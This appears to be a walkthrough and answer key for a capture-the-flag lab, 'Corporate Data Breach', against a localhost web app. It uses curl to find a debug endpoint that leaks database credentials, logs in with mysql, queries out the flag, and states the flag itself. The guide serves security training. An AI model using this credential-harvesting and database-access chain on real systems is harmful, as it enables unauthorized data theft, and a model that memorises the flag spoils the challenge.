# CTF Challenge Solution Guide

## Overview
This document provides a complete walkthrough for solving the "Corporate Data Breach" CTF challenge. It demonstrates the step-by-step process that participants should follow to successfully capture the flag.

## Step 1: Initial Reconnaissance

Start by accessing the web application at http://localhost:8080

```bash
curl http://localhost:8080
```

Explore the available endpoints by checking the navigation links and testing common paths:

```bash
curl http://localhost:8080/info
curl http://localhost:8080/debug
curl http://localhost:8080/admin
```

## Step 2: Information Disclosure Discovery

The `/debug` endpoint reveals sensitive environment variables:

```bash
curl http://localhost:8080/debug
```

Expected output:
```
Environment Variables:
DB_HOST=10.1.2.20
DB_USER=webapp
DB_PASS=SecureP@ss123
DB_NAME=corporate_db
DEBUG_MODE=true
```

## Step 3: Database Access

Use the discovered credentials to connect to the database:

```bash
mysql -h 10.1.2.20 -u webapp -p'SecureP@ss123' corporate_db
```

## Step 4: Database Enumeration

List available tables:
```sql
SHOW TABLES;
```

Examine the customer_data table structure:
```sql
DESCRIBE customer_data;
```

## Step 5: Flag Extraction

Query the customer_data table to find the flag:
```sql
SELECT * FROM customer_data WHERE secret_notes LIKE 'CTF{%}';
```

The flag should be: `CTF{exposed_db_credentials_are_dangerous_123}`

## Alternative Discovery Methods

Participants might also discover the vulnerability through:
- Directory enumeration tools (dirb, gobuster)
- Web application scanners
- Manual testing of common debug endpoints
- Source code analysis (if available)

## Learning Points

This solution demonstrates:
1. The importance of proper environment variable management
2. Network segmentation failures
3. Information disclosure through debug interfaces
4. Database security misconfigurations
5. The attack chain from reconnaissance to data exfiltration

